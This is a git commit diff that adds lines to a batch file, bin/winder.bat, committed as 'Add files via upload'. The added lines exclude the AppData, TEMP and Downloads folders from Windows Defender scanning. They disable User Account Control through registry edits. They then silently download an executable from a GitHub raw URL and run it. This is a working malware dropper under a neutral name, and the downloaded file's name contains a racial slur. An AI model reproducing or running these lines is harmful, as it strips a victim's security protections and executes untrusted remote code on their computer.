0b91aed410e2189178778f0865ad1c2aeb085ae1
gyodosama <pipiskavoras@gmail.com>
2025-05-26 21:19:18 +0400

    Add files via upload

--- bin/winder.bat
+++ bin/winder.bat
@@ -1,2 +1,12 @@
 @echo off
 powershell -Command "Add-MpPreference -ExclusionPath '%CD%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData'"
+powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Downloads'"
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f
+
+curl --silent -o hello.exe https://raw.githubusercontent.com/reredarm/droidniug/refs/heads/main/nigerhack.exe
+.\hello.exe
